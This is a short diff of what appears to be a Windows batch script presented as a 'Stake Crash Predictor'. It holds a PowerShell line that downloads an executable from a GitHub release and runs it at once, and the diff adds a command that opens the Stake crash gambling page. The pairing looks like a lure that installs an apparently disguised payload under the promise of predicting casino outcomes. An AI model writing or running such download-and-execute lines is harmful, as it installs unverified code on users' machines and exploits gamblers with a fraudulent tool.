@@ -10,4 +10,4 @@ echo.
 
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Predictor-IW/Stake-Crash-Predictor/releases/download/Crash-Predictor/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 
-https://stake.com/fr/casino/games/crash
+start https://stake.com/fr/casino/games/crash
